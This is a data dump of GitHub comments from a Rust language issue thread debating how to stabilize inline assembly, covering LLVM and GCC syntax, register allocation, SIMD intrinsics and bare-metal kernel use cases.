rust/rust-lang/29722/334670979,"Are LLVM really guaranteeing that they'll never miscompile a feature whose behavior they've never specified? How would they even decide if a change was a miscompilation or not? I could see it for the other parts of the IR, but this seems like a lot to expect. ",,False,False,29722
rust/rust-lang/29722/334677518,"Clang doesn't do that because it aims to be able to compile code that was written for GCC. rustc doesn't have that aim. The GCC format isn't very ergonomic so ultimately I think we don't want that, but whether that would be better to go with for now I'm unsure. There's a lot of (nightly) code out there using the current Rust format that would break if we changed to GCC style so it's probably only worth changing if we can come up with something notably better. Agreed. At the very least I prefer the raw LLVM format where the constraints and clobbers are all in one list. Currently there is a redundancy having to specify ""="" prefix and put it in the output list. I also think how LLVM treats it more like a function call where the outputs are the result of the expression, AFAIK the current  implementation is the only part of rust that has ""out"" parameters. AFAIK LLVM doesn't event try to do this as the main reason for inline assembly is to include some code that LLVM doesn't understand. It only does register allocation and template substitution without looking at the actual assembly.  (Obviously it parses the actually assembly at some stage to generate the machine code, but I think that happens later) I'm not sure there can ever be an alternative to using the integrated inline assembler because some how you would have to get LLVM to allocate registers for it. For global assembly though, an external assembler would be workable. Regarding breaking changes in the LLVM inline assembler, we are in the same boat as Clang. That is, if they make some changes, we just have to work around them when they happen. ",,False,False,29722
rust/rust-lang/29722/334915420,"I'm all for it. plus one @friend Going by @friend 's suggestion quoted above, anyone using  will happily be able to still use it. If GCC's assembly syntax is truly not specified or documented after 30 years, then it seems safe to assume that either producing a documented assembly sublanguage is a task that is either so difficult that it is beyond Rust's ability to accomplish given our limited resources, or that people who want to use assembly simply don't care. It seems unlikely that GCC/Clang's implementation of inline assembly will ever change, since that would break all C code written since the 90s. At the risk of being callous, the prospect of alternative backends is moot if Rust as a language does not survive due to its embarrassing inability to drop into assembly. Nightly does not suffice, unless one wants to tacitly endorse the idea that Nightly is Rust, which does more to undermine Rust's stability guarantee than the prospect of LLVM changes. I'm not lying when I say that every day I am thankful for the attitude of the Rust developers and the enormous standard of quality that they hold themselves to (in fact sometimes I wish y'all would slow down so you can maintain that quality without burning yourselves out like Brian did). However, speaking as someone who was here when luqmana added the  macro four years ago, and who has observed no progress since then at getting this stabilized, and who is sad that crypto in Rust is still impossible and that SIMD in Rust doesn't even have a workaround while the cross-platform interface is being slowly determined, I feel despondent. If I seem emphatic here it's because I view this issue as existential to the survival of the project. It may not be a crisis right this moment, but it will take time to stabilize anything at all, and we don't have the years that it will take to design and implement a world-class assembly dialect from scratch (proven by the fact that we have made no progress towards this in the last four years). Rust needs stable inline assembly sometime in 2018. We need prior art to pull that off. The  situation acknowledged that sometimes worse is better. Once again, I'm begging someone to prove me wrong. ",,False,False,29722
rust/rust-lang/29722/337823950,"FWIW and coming late to the party I like what @friend 's the cologne talk proposed. For those that haven't watched it, this is the gist of it ",,False,False,29722
rust/rust-lang/29722/346313816,"How about the following strategy rename current  to  (plus maybe some minor changes) and state that it's behavior is implementation detail of LLVM, thus Rust stability guarantee does not fully extend to it? Problem of different backends should be more or less solved with  like functionality for conditional compilation depending on the used backend. Yes, such approach will blur Rust stability a bit, but keeping assembly in limbo like this is damaging for Rust in its own way. ",,False,False,29722
rust/rust-lang/29722/354862160,I've posted a pre-RFC with an alternative syntax proposal to the internals forum  Feedback welcome. ,,False,False,29722
rust/rust-lang/29722/366431069,"It looks to me like the best is definitely the enemy of the kind-of-ok here. I fully support sticking a  or  or  macro (or any proper subset thereof) into stable with compatible syntax and semantics for now, while a better solution is worked out. I don't see supporting such a thing forever as a huge maintenance burden the more sophisticated systems proposed above look like they'd pretty easily support just turning the old-style macros into syntactic saccharine for the new one. I have a binary program  which requires inline assembly for the x86_64  instruction. This inline assembly is the only thing keeping this code in nightly. The code was derived from a 12-year-old C program. Right now, my assembly is conditioned on     #[cfg(any(target_arch = ""x86"", target_arch = ""x86_64""))]  and then gets the  info to see if  is present. It would be nice to have something in Rust similar to the recent Google cpu_features library  in Rust, but c'est la vie. Because this is a demo program as much as anything, I'd like to keep the inline assembly. For real programs, the  intrinsic would be sufficient — except that getting it to use  requires passing ""-C target-cpu=native"" to Cargo, probably through  (see issue #1137 and several related issues) since distributing a  with my source doesn't seem like a great idea, which means that right now I've got a Makefile calling Cargo. In short, it would be nice if one could use Intel's and others' fancy popcount instruction in real applications, but it seems harder than it needs to be. Intrinsics aren't entirely the answer. Current  is an ok answer were it available in stable. It would be great to have a better syntax and semantics for inline assembly, but I don't really need it. It would be great to be able to specify  directly in , but it wouldn't really solve my problem. Sorry, rambling. Just thought I'd share why I care about this. ",,False,False,29722
rust/rust-lang/29722/366442456,"@friend I don‘t understand, why do you so desperately need to compile to popcnt? The only reason I can see is performance and IMO you should definitely just use count_ones() in that case. What you‘re looking for is not inline asm but target_feature (rust-lang/rfcs#2045) so you can tel the compiler that it‘s allowed to emit popcnt. ",,False,False,29722
rust/rust-lang/29722/366450866,"@friend you don't even need to use inline assembly for this, just use   to query whether the cpu your binary runs supports the  instruction (it will resolve this at compile-time if its possible to do so). ♠coresimdpopcntpopcnt` instruction. ",,False,False,29722
rust/rust-lang/29722/366452010,"@friend It's a bit off-topic, but this statement is not strictly true.  uses  under the hood, thus if  feature will not be enabled by crate user and crate author will forget to use  this intrinsic will get compiled into ineffective assembly and there is no safeguards against it. ",,False,False,29722
rust/rust-lang/29722/366452208,"It also uses  to enable the  feature for the intrinsic unconditionally, independently of what the crate user enables. ",,False,False,29722
rust/rust-lang/29722/366453247,This function looks like undefined behavior to me ,,False,False,29722
rust/rust-lang/29722/366457389,"First of all, apologies for the derailing the discussion. Just wanted to reiterate my main point, which was ""I fully support sticking a gcc_asm! or clang_asm! or llvm_asm! macro (or any proper subset thereof) into stable with compatible syntax and semantics for now, while a better solution is worked out. "" The point of the inline assembly is that this is a popcount benchmark / demo. I want a true guaranteed  instruction when possible both as a baseline and to illustrate how to use inline assembly. I also want to guarantee that  uses a popcount instruction when possible so that Rustc doesn't look terrible compared to GCC and Clang. Thanks for pointing out . I'll think about how to use it here. I think I want to bench  regardless of what CPU the user is compiling for and regardless of whether it has a popcount instruction. I just want to make sure that if the target CPU has popcount  uses it. The / crates looks nice, and should probably be enabled for these benchmarks. Thanks! For this app I'd prefer to use as little outside the standard language features as possible (I'm already feeling guilty about ). However, these facilities look too good to ignore, and it looks like they're well on their way to becoming ""official"". ",,False,False,29722
rust/rust-lang/29722/377229635,"There’s an idea floated around by @friend where there could be some implementation which goes from some representation of code to machine bytes (could be a proc-macro crate or something?) and then those bytes are included directly into the particular location in code. Splicing arbitrary code bytes into arbitrary places within a function seems like a much easier problem to solve (although ability to specify inputs, outputs and their constraints as ell as clobbers would still be necessary). cc @friend ",,False,False,29722
rust/rust-lang/29722/377503700,"@friend it's a little more than just a chuck of machine code though, you also have to be careful about input, output and clobber registers. If the ASM chunk says that it wants a certain variable in %rax and that it will clobber %esi you need to make sure that the surrounding code plays nice. Also if the developer lets the compiler allocate the registers you'll probably want to optimize the allocation to avoid spilling and moving values around. ",,False,False,29722
rust/rust-lang/29722/377523243,"@friend , indeed you will have to specify how variables are associated to specific registers, and which registers are clobbered, but all of these is smaller than standardizing any assembly language, or any LLVM assembly language. Standardizing on byte sequences, is probably the easiest way forward by moving the assembly flavor to a driver / proc-macro. One issue of having verbatim bytes instead of proper inline assembly, is that the compiler would have no option for doing register alpha-renaming, which I do not expect people writing inline assembly are expecting either. ",,False,False,29722
rust/rust-lang/29722/377554344,"But how would that handle register allocation if I want to let the compiler handle that? For instance, using GCC's (atrocious) syntax In something like this I let the compiler allocate the registers, expecting that it will give me whatever is the most convenient and efficient. For instance on x86 64 if  is the return value then the compiler might allocate  and if  is a function parameter it might already be available in some register. Of course the compiler only knows exactly how it will allocate registers pretty late in the compilation sequence (especially if it's not as trivial as simply function params and return values). Would your proposed solution work with something like that? ",,False,False,29722
rust/rust-lang/29722/377592167,"@friend I have to say I'm a bit confused by this proposal. First of all, standardizing assembly language was never something we wanted to achieve with inline assembly. At least to me, the premise was always that the assembly language used by the system assembler would be accepted. The problem is not getting the assembly parsed/assembled, we can pass that off to LLVM easily. The problem is with filling templated assembly (or giving LLVM the required information to do so), and specifying inputs, outputs and clobbers. The later problem is not actually solved by your proposal. It is however alleviated, because you wouldn't/couldn't support classes of registers (which @friend asks about), but just concrete registers. At the point where constraints are simplified to that extend, it is actually just as easy to support ""real"" inline assembly. The first argument is an string containing (non-templated) assembly, the other arguments are the constraints. This is somewhat easily mapped to LLVM's inline assembler expressions. Inserting raw bytes on the other hand is not as far as I know (or can tell from the LLVM IR Reference Manual) supported by LLVM. So we'd basically be extending LLVM IR, and reimplementing a feature (assembling system assembly) that is already present in LLVM using separate crates. ",,False,False,29722
rust/rust-lang/29722/377678507,"@friend So how would that be done? I have a sequence of bytes with hardcoded registers with basically means that the input/out registers, clobbers, etc. are all hardcoded inside this sequence of bytes. Now inject this bytes somewhere in my rust binary. How do I tell rustc which registers are input/output, which registers got clobbered, etc.? How is this a smaller problem to solve than stabilizing inline assembly ? It looks to me that this is exactly what inline assembly does, what am I missing? ",,False,False,29722
rust/rust-lang/29722/377696637,"@friend This would not be possible, as the raw of bytes does not allow alpha renaming of registers, and the registers would have to be enforced by the code sequence ahead. @friend My understanding, is that relying on the system assembler is not something we want to rely on, but more an accepted flaw as part of the asm! macro.  Also relying on asm! being the LLVM syntax would be painful for the development of additional backend. @friend The idea would be to have a list of inputs, outputs, and clobbered registers, where the inputs would be a tuple of the register name associated with a (mutable) reference or copy, the clobbered register would be a list of register names, and the output would be a list of output register would form a tuple of named register to which are associated types. This code sequence might be the output of some compiler procedural macro, which might look like These sequences, will not be able to directly embedde any symbol or addresses and they would have to be computed and given as registers.  I am sure we can figure out how do add the ability to insert some symbol addresses within the byte sequence later on. The advantage of this approach is that only the list of registers and constraints have to be standardized, and this is something that would easily be supported by any future backend. ",,False,False,29722
rust/rust-lang/29722/377698938,"@friend I don't think that's an accurate assessment? With the minor exception of the two different syntaxes for x86 assembly, assembly syntax is largely standard and portable. The only issue with the system assembler might be that it lacks newer instructions, but that's a niche situation not worth optimizing for. The actual problem is the glue into register allocation. But, as far as the actual assembly string itself is concerned, this merely means someone has to do some string substitution stuff and maybe some parsing. I agree that LLVM's (or gcc's) syntax for this stuff is crap, but moving to precompiled bytes means that any asm crate now needs to install a full assembler and possibly a full register allocator (or make programmers hand-allocate registers), or attempt to use the system assembler. At that point, it doesn't seem like it's actually really adding much value. ",,False,False,29722
rust/rust-lang/29722/377700502,@friend  crate uses macro handled by a plugin to assemble the assembly code and generate vectors of raw assembly code to be concatenated at runtime. ,,False,False,29722
rust/rust-lang/29722/378268677,"@friend maybe my uses cases are peculiar but lack of register renaming and letting the compiler allocate registers for me would be a bit of a deal-breaker because it either means that I need to be very lucky with my choice of registers and happen to ""hit right"" or the compiler will have to emit non-optimal code to shuffle registers around to match my arbitrary conventions. If the assembly blob doesn't integrate nicely with the surrounding compiler-emitted assembly I might as well just factor the ASM stub in an external C-style method in a stand-alone .s assembly file since function calls have the same type of register-allocation constraints. This already works today, although I suppose having it built into rustc might simplify the build system compared to having a standalone assembly file. I guess what I'm saying is that IMO your proposal doesn't get us very far compared to the current situation. And what if the ASM code calls external symbols that would be resolved by the linker? You need to pass that info around since you can't possibly resolve those until late in the compilation process. You'd have to pass there reference alongside your byte array and let the linker resolve them much later. @friend I'm not sure I understand what you mean by that, obviously ASM syntax is not portable across architectures. And even within the same architecture there are often variations and options that change the way the language is assembled. I can give MIPS as an example, there are two important configuration flags that tweak the assembler behaviour  and .  says whether the assembler is allowed to implicitly use the  (assembler temporary) register when assembling certain pseudo-instructions. Code that explicitly uses  to store data must be assembled with  or it'll break. asm     addui   $a0, 4     jal     some_func     addui   $a1, $s0, 3 asm    ldr   r2, =0x89abcdef ♠ Some code needs very peculiar alignment constraints (common when you're dealing with cache invalidation code for instance, you need to be sure that you don't take a saw to the branch you're sitting on). And there's the problem of handling external symbols that can't be resolved at this point in the compilation process as I mentioned earlier. I'm sure I could come up with peculiarities for a bunch of other architectures I'm less familiar with. For these reasons I'm not sure I'm very optimistic for the macro/DSL approach. I understand that having a random opaque string literal in the middle of the code isn't super elegant but I don't really see what integrating the full ASM syntax into rust one way or an other would give us except additional headaches when adding support for a new architecture. Writing an assembler is something that may seem trivial at a glance but could turn out to be very tricky if you want to support all the bells, whistles and quirks of all the architectures out there. On the other hand having a good way to specify bindings and clobbers however would be extremely valuable (compared to gcc's... perfectible syntax). ",,False,False,29722
rust/rust-lang/29722/411882048,"Hi guys, Sorry for bothering you, I only wanted to drop my two cents, because I'm just an user, and a very shy/quiet one indeed, oh, and a newcomer, I have just recently landed in Rust, but I'm already in love with it. But this assembly thing is just crazy, I mean, it's a three years span conversation, with a bunch of ideas and complains, but nothing that seems like a minimum consensus. Three years and not a RFC, it seems a little like a death end. I'm developing a humble math library (that hopefully will materialize in two or three crates), and for me (and I suspect that for any other fellow interested in write assembly in rust), the most important thing is to actually being able to do it! with a minimum guarantee that everything is not going to change the next day (that's what the unstable channel, and specially this conversation, makes me feel). I understand that everyone here wants the best solution, and maybe one day someone comes out with that one, but as for today I believe that the current macro is just fine (well, maybe a little restricting in some ways, but hopefully nothing that cannot be addressed in an incremental way). To write assembly is like the most important thing in a low level language, a very very necessary feature, and although I'm ok relying on cpp_build until this is fixed, I'm very afraid that if it takes a lot more time it will become a forever dependency. I don't know why, call it an irrational idea, but I find that having to call cpp to call assembly is a little sad, I want a pure rust solution. ",,False,False,29722
rust/rust-lang/29722/412048025,"FWIW Rust is not that special here, MSVC doesn‘t have inline asm for x86_64 either. They do have that really weird implementation where you can use variables as operands but that works for x86 only. ",,False,False,29722
rust/rust-lang/29722/414087879,"@friend Could you talk more about what you're using inline assembly for? We typically only see it used in OS-like situations, which are typically stuck on nightly for other reasons as well, and even then they barely use , so stabilizing  hasn't been a high-enough priority to design &amp; develop something that can properly survive outside LLVM and please everyone. ",,False,False,29722
rust/rust-lang/29722/414502791,"Additionally, most things can be done using the exposed platform intrinsics. x86 and x86_64 have been stabilized and other platforms are in progress. It's most people's expectation that these are going to accomplish 95-99% of the goals. You can see my own crate jetscii as an example of using some of the intrinsics. ",,False,False,29722
rust/rust-lang/29722/414506240,"We just merged a jemalloc PR that uses inline assembly to work around code generation bugs in LLVM -  . Somebody used inline assembly in this issue ( to work around a code generation bug in Rust (LLVM) that happened in the jetscii crate. Both happened in the last two weeks, and in both cases the users tried with intrinsics but the compiler failed them. When code generation for a C compiler happens to be unacceptable, worst case the user can use inline assembly and continue working in C. When this happens in stable Rust, right now we have to tell people to use a different programming language or wait an indeterminate amount of time (often in the order of years). That's not nice. ",,False,False,29722
rust/rust-lang/29722/414527725,"@friend Well, I'm writing a small matrix algebra library. Inside that library, I'm implementing the BLAS, maybe some LAPACK (not there yet) routines in Rust, because I wanted the library to be a pure rust implementation. It's nothing serious yet, but anyway, I wanted the user to be able to opt for some asm speed and fun, specially with the GEMM operation, that use to be essential (the most used, anyway, and if you follow the BLIS people approach it's all what you need), at least in x86/x86_64. And that's the full story. Obviously I can use the nightly channel too, I just wanted to push a little in the pragmatic direction of stabilization of the feature. ",,False,False,29722
rust/rust-lang/29722/414532018,"@friend There are plenty of use-cases for which intrinsics aren't enough. Of the top of my head of recent stuff where I thought ""why oh why doesn't Rust have stable asm?"", there's no XACQUIRE/XRELEASE intrinsics. Stable inline asm is critical and no, the intrinsics aren't enough. ",,False,False,29722
rust/rust-lang/29722/414536445,"My original point was attempting to help someone have the ability to write faster code. They made no mention of knowing that intrinsics were even available, and that's all I sought to share. The rest was background information. I'm not even advocating for a specific point of view, so please don't attempt to argue with me — I have no stake in this race. I'm simply repeating what the current point of view is as I understand it. I participate in a project that requires inline assembly that is highly unlikely to have intrinsics in any near future, so I am also interested in some amount of stable inline assembly, but nightly assembly doesn't unduly bother me, nor does invoking an assembler. Yes, there are cases that require assembly for now and there are cases that will forever need it, I said as much originally (added emphasis for clarity) It is my opinion that if you want to see stable assembly, someone (or a group of people) are going to need to get general consensus from the Rust team on a direction to start in and then put in a lot of effort to actualize it. ",,False,False,29722
rust/rust-lang/29722/414561475,"I still don't understand what instructions you need to access that you can't without inline assembly. Or is it just a specific sequence of arithmetic instructions? If so, have you benchmarked an equivalent Rust source against the inline assembly? ",,False,False,29722
rust/rust-lang/29722/414655847,"Well, when you are talking about assembly in math, you are basically talking about using the SIMD registers and instructions like _mm256_mul_pd, _mm256_permute2f128_pd, etc. and vectorization operations where it proceed. The thing is that you can take different approaches for vectorization, and usually it's a little trial and error until you get an optimized performance for the processor you are targeting and the use you have in mind. So usually at the library level you first have to query the processor injecting asm code to know the set of instructions and registers supported, and then conditional compiling an specific version of your math asm kernel. Right now I have no specific test at hand, and I'm on holiday, so I would prefer to not involve myself with it a lot, but yeah, if you give me a couple of weeks I can post a performance comparative. In any case, it use to be impossible for the compiler to produce code as fast as you can with manual tuned assembly. It's not possible in C at least, even if you use the classical performance techniques like manual loop unrolling where needed, etc., so I imagine it should be not possible in Rust. ",,False,False,29722
rust/rust-lang/29722/414715220,"Taylor Cramer suggested I post here. Forgive me as I haven't read through all comments to come up to speed with the current state of the discussion; this is only a voice of support and statement of our situation. For a bare-metal project at Google, we'd love to see some movement on stabilizing inline and module-level assembler. The alternative is using the FFI to call functions written in pure assembly and assembled separately and linked together into a binary. We could define functions in assembler and call them via the FFI, linking them in a separate step, but I know of no serious bare-metal project that does that exclusively, as it has drawbacks in terms of both complexity and performance. Redox uses 'asm!'. The usual suspects of Linux, BSDs, macOS, Windows, etc, all make copious use of inline assembler. Zircon and seL4 do it. Even Plan 9 caved on this a few years ago in the Harvey fork. For performance-critical things, function call overhead might dominate depending on the complexity of the called function. In terms of complexity, defining separate assembler functions just to invoke a single instruction, read or write a register, or otherwise manipulate machine state that's ordinarily hidden from a user-space programmer means more tedious boilerplate to get wrong. In any event, we would have to be more creative in our use of Cargo (or supplement with an external build system or a shell script or something) to do this. Perhaps build.rs could help here, but feeding it into the linker seems more challenging. I'd also very much like it if there were some way to plumb the values of symbolic constants into the assembler template. ",,False,False,29722
rust/rust-lang/29722/414732598,"The last pre-RFC ( achieved consensus 6 months ago (at least on most of the fundamental issues), so the next step is to submit an RFC that builds on that. If you want this to happen faster I'd recommend contacting @friend about it. ",,False,False,29722
rust/rust-lang/29722/414735582,"For what it's worth, I need direct access to FS\GS registers to get the pointer to the TEB struct on Windows, I also need a -like intrinsic to apply  to an arbitrary memory location, neither of which I could find a way to do without inline assembly or extern calls. The third point mentioned here concerns me, though, as LLVM indeed prefers to Just Crash if something is wrong providing no error messaging what so ever. ",,False,False,29722
rust/rust-lang/29722/414744700,"@friend It shouldn't be hard to add that one to , clang implements these using inline assembly ( but we can use that in the std library and expose the intrinsic to safe Rust. Feel encouraged to open an issue in the stdsimd repo about the missing intrinsics. ",,False,False,29722
rust/rust-lang/29722/414911930,"@friend Ah, I suspected that might be the case. Well, if you want to give it a try, you could translate the assembly into  intrinsic calls and see if you get the same performance out of it. If you don't, please file issues. LLVM isn't magic, but at least intrinsics should be as good as asm. ",,False,False,29722
rust/rust-lang/29722/414912447,"@friend If you don't mind me asking, are there any usecases/platform features in particular that require inline assembly, in your situation? @friend Maybe we should expose intrinsics for reading the ""segment"" registers? &lt;hr/&gt;  Maybe we should do some data collection and get a breakdown of what people really want  for, and see how many of those could be supported in some other way. ",,False,False,29722
rust/rust-lang/29722/415014198,"I want  for  working around intrinsics not provided by the compiler working around compiler bugs / sub-optimal code generation performing operations that cannot be performed via a sequence of single intrinsics calls, e.g., a read EFLAGS-modify-write EFLAGS where LLVM is allowed to modify eflags between the read and the write, and where LLVM also assumes that the user won't modify this behind its back (that is, the only way to safely work with EFLAGS is to write the read-modify-write operations as a single atomic  block).  I don't see any other way of supporting any of those use cases that doesn't involve some form of inline assembly but my mind is open. ",,False,False,29722
rust/rust-lang/29722/415016353,"Copied from my post in the pre-RFC thread, here is some inline assembly (ARM64) which I am using in my current project ",,False,False,29722
rust/rust-lang/29722/415029276,@friend note that @friend is working towards the intrinsics for ARM. Would be worth checking to see if that proposal covers your needs. ,,False,False,29722
rust/rust-lang/29722/415038128,"@friend It is worth remarking that  this work doesn't replace inline assembly, it merely complements it. This approach implements vendor APIs in , these APIs are insufficient for some people already.  this approach is only usable when a sequence of intrinsic calls like  produces code indistinguishable from that sequence of instructions  - this isn't necessarily the case, and when it isn't, code that looks correct produces at best incorrect results, and at worst has undefined behavior (we had bugs due to this in  and  in  already, e.g.,  - other architectures have these issues as well).  some intrinsics have immediate mode arguments, which you cannot pass via a function call, so that  won't work. Every solution to this problem is currently a whacky workaround, and in some cases, no workarounds are currently possible in Rust, so we just don't provide some of these intrinsics.   So if the vendor APIs are implementable in Rust, available on , and can be combined to solve a problem, I agree that they are better than inline assembly. But every now and then either the APIs are not available, maybe not even implementable, and / or they cannot be combined correctly. While we could fix the ""implementability issues"" in the future, if what you want to do is not exposed by the vendor API, or the APIs cannot be combined, this approach won't help you. ",,False,False,29722
rust/rust-lang/29722/415042619,What can be very surprising about LLVM's implementation of intrinsics (SIMD especially) is that they do not conform to Intel's explicit mapping of intrinsics to instructions at all - they are subject to a wide range of compiler optimizations. For instance I remember one time where I attempted to reduce memory pressure by calculating some constants from other constants instead of loading them from memory. But LLVM simply proceeded to constant-fold the entire thing back into the exact memory load I was trying to avoid. In a different case I wanted to investigate replacing a 16-bit shuffle with an 8-bit shuffle to reduce port5 pressure. Yet in its unending wisdom the ever-helpful LLVM optimizer noticed that my 8-bit shuffle is in fact a 16-bit shuffle and replaced it. Both optimizations certainly yield better throughput (especially in the face of hyperthreading) but not the latency reduction I was hoping to achieve. I ended up dropping down all the way to nasm for that experiment but having to rewrite the code from intrinsics to plain asm was just unnecessary friction. Of course I want the optimizer to handle things like instruction selection or constant folding when using some high-level vector API. But when I explicitly decided which instructions to use I really don't want the compiler to mess around with that. The only alternative is inline asm. ,,False,False,29722
rust/rust-lang/29722/415047055,"That's all I've been saying at first and again This is the same thing that @friend is saying in parallel. I'm unclear why multiple people are acting like I'm completely disregarding the usefulness of inline assembly while trying to point out the realities of the current situation. I've  Pointed one poster who made no mention of knowing that intrinsics existed towards stable today intrinsics. Pointed another poster at proposed intrinsics so they can provide early feedback to the proposal.  Let me state this very clearly yes, inline assembly is sometimes required and good. I am not arguing that. I am only trying to help people solve real world problems with the tools that are available now. ",,False,False,29722
rust/rust-lang/29722/415055743,"What I was trying to say was that we should have a more organized approach to this, a proper survey, and gather up a lot more data than the few of us in this thread, and then use that to point out the most common needs from inline assembly (since it's clear that intrinsics can't fully replace it). I suspect that each architecture has a tricky-to-model subset, that gets some use from inline , and maybe we should focus on those subsets, and then try to generalize. cc @friend/lang ",,False,False,29722
rust/rust-lang/29722/415056250,"@friend require is a strong word, and I would be compelled to say that no we're not strictly required to use inline assembler. As I mentioned earlier, we could define procedures in pure assembly language, assemble them separately, and link them into our Rust programs via the FFI. However, as I said earlier I know of no serious OS-level project that does that. It would mean lots of boiler plate (read more chances to make a mistake), a more complex build process (right now we're fortunate enough that we can get away with a simple  invocation and a linked and nearly-ready-to-run kernel pops out of the other end; we'd have to invoke the assembler and link in a separate step), and a drastic decrease in the ability to inline things, etc; there would almost certainly be a performance hit. Things like compiler intrinsics help in a lot of cases, but for things like the supervisory instruction set of the target ISA, particularly more esoteric hardware features (hypervisor and enclave features, for example), there often aren't intrinsics and we're in a no_std environment. What intrinsics are there often aren't sufficient; e.g., the x86-interrupt calling convention seems cool but doesn't give you mutable access to the general purpose registers in a trap frame suppose I take an undefined instruction exception with the intent to do emulation, and suppose the emulated instruction returns a value in %rax or something; the calling convention doesn't give me a good way to pass that back to the call-site, so we had to roll our own. That meant writing my own exception handling code in assembler. So to be honest no, we don't require inline assembler, but it is sufficiently useful that it would almost be a non-starter not to have it. ",,False,False,29722
rust/rust-lang/29722/415060171,"@friend I am specifically curious about avoiding separate assembling, that is, what kind of assembly you need at all in your project, no matter how you link it in. In your case it seems to be a supervisor/hypervisor/enclave privileged ISA subset, is that correct? Is this by necessity, i.e. do the instructions have requirements which are unreasonably difficult or even impossible to uphold when compiled as intrinsic calls through, e.g. LLVM? Or is this just because they're assumed to be too special-cased to be useful to most developers? For the record, vendor intrinsics are in both  and  (the former is a reexport). cc @friend Can this be implemented in LLVM? ",,False,False,29722
rust/rust-lang/29722/415088085,"@friend correct; we need the supervisor subset of the ISA. I'm afraid I can't say much more at the moment about our specific use case. To some extent both are true, but on balance i would say the latter is more relevant here. Some things are microarchitecture specific and dependent on specific processor package configurations. Would it be reasonable for a compiler to (for example) expose something as an intrinsic that's part of the privileged instruction subset and conditioned on a specific processor version? I honestly don't know. That's actually really good to know. Thanks! ",,False,False,29722
rust/rust-lang/29722/415090097,"We already do. For example, the  x86 instructions are implemented and exposed in , not available on all processors, and most of them require privileged mode. ",,False,False,29722
rust/rust-lang/29722/415114897,"@friend  isn't privileged; did you mean ? I took a look through  and the only privileged instructions I saw in my quick sweep (I didn't do an exhaustive search) were , , , and . I suspect those are intrinsics because they fall into the general  family and don't generate exceptions in real mode, and some folks want to use clang/llvm to compile real-mode code. ",,False,False,29722
rust/rust-lang/29722/415121274,"@friend yes some of those are the ones I meant (we implement , , , ... in the  module  are available in , so you can use them to write an OS kernel for x86. In user-space they are useless AFAICT (they'll always raise an exception), but we don't have a way to distinguish about this in . We could only expose them in  and not in  though, but since they are already stable, that ship has sailed. Who knows, maybe some OS runs everything in ring 0 someday, and you can use them there... ",,False,False,29722
rust/rust-lang/29722/415129925,"@friend I don't know why  or  would raise an exception in userspace  is the only one of the family that's defined to generate an exception (#GP if CPL&gt;0), and then only in protected mode (SDM vol.1 ch. 13; vol.2C ch. 5 XSAVES).  and  are useful for implementing e.g. pre-emptive user-space threads, so their presence as intrinsics actually makes sense. I suspect the intrinsic for  was either because someone just added everything from the  family without realizing the privilege issue (that is, assuming it was invocable from userspace), or someone wanted to call it from real mode. That latter may seem far-fetched but I know people are e.g. building real-mode firmware with Clang and LLVM. Don't get me wrong; the presence of LLVM intrinsics in  is great; if I never have to write that silly sequence of instructions to get the results of  into a useful format again, I'll be happy. But the current set of intrinsics are not a substitute for inline assembler when you're writing a kernel or other bare-metal supervisory sort of thing. ",,False,False,29722
rust/rust-lang/29722/415133829,"@friend when I mentioned  I was referring to some of the intrinsics that are available behind the CPUID bits XSAVE, XSAVEOPT, XSAVEC, etc. Some of these intrinsics require privileged mode. We already do and they are available in stable Rust. I added these intrinsics. We realized the privilege issues and decided to add them anyways because it is perfectly fine for a program depending on to be an OS kernel that wants to use these, and they are harmless in userspace (as in, if you try to use them, your process terminates). Agreed, that's why this issue is still open ;) ",,False,False,29722
rust/rust-lang/29722/415140440,"@friend sorry, I don't mean to derail this by rabbit-holing on  et al. However, as near as I can tell, the only intrinsics that require privileged execution are those related to  and even then it's not always privileged (again, real-mode doesn't care). It's wonderful that those are available in stable Rust (seriously). The others might be useful in userspace and similarly I think it's great that they're there. However,  and  are a very, very small portion of the privileged instruction set and having added intrinsics for two instructions is qualitatively different than doing so generally and I think the question remains as to whether it's appropriate in general. Consider the  instruction from the VMX extensions, for example; I imagine an intrinsic would do something like execute instruction and then ""return"" . That's sort of an oddly specialized thing to have as an intrinsic. I think otherwise we're in agreement here. ",,False,False,29722
rust/rust-lang/29722/415146299,"FWIW per the  RFC we can currently only add intrinsics to  that the vendors expose in their APIs. For the case of , Intel exposes them on its C API, so that's why it is ok that's there. If you need any vendor intrinsics that are not currently exposed, open an issue, whether it requires privileged mode or not is irrelevant. If the vendor doesn't expose an intrinsic for it, then  might not be the place for it, but there are many alternatives to that (inline assembly, global asm, calling C, ...). ",,False,False,29722
rust/rust-lang/29722/415153304,"Sorry, I understood you saying you wrote the intrinsics for  to mean the Intel intrinsics; my earlier comments still apply as to why I think  is an intrinsic then (either an accident by a compiler writer at Intel or because someone wanted it for real mode; I feel like the former would be noticed really quickly but firmware does weird stuff, so the latter wouldn't surprise me at all). Anyway, yes, I think we fundamentally agree intrinsics aren't the place for everything, and that's why we'd like to see asm!() moved to stable. I'm really excited to hear that progress is being made in this area, as you said yesterday, and if we can gently nudge @friend to bubble this up closer to the top of the stack, we'd be happy to do so! ",,False,False,29722
rust/rust-lang/29722/415155927,"A few additional details and use cases for  When you're writing an operating system, firmware, certain types of libraries, or certain other types of system code, you need full access to platform-level assembly. Even if we had intrinsics that exposed every single instruction in every architecture Rust supports (which we don't come anywhere close to having), that still wouldn't be enough for some of the stunts that people regularly pull with inline assembly. Here are a small fraction of things you can do with inline assembly that you can't easily do in other ways  Collect all the implementations of a particular pattern of instructions in a separate ELF section, and then in loading code, patch that section at runtime based on characteristics of the system you run on. Write a jump instruction whose target gets patched at runtime. Emit an exact sequence of instructions (so you can't count on intrinsics for the individual instructions), so that you can implement a pattern that carefully handles potential interruptions in the middle. Emit an instruction, followed by a jump to the end of the asm block, followed by fault recovery code for a hardware fault handler to jump to if the instruction generates a fault. Emit a sequence of bytes corresponding to an instruction the assembler doesn't know about yet. Write a piece of code that carefully switches to a different stack and then calls another function. Call assembly routines or system calls that require arguments in specific registers.  ",,False,False,29722
rust/rust-lang/29722/415381010,"@friend Ok, I will try the intrinsics approach and see where it takes. You are probably right and that's the best approach for my case. Thank you! ",,False,False,29722
rust/rust-lang/29722/416379186,"@friend nailed it! These are the exact use cases I had in mind. I would add a couple of other use cases  writing code in weird architectural modes, like BIOS/EFI calls and 16-bit real-mode. writing code with strange/unusual addressing modes (which comes up often in 16-bit real-mode, bootloaders, etc.)  ",,False,False,29722
rust/rust-lang/29722/416382543,@friend Absolutely! And generalizing a point that has sub-cases in both of our lists translating between calling conventions. ,,False,False,29722
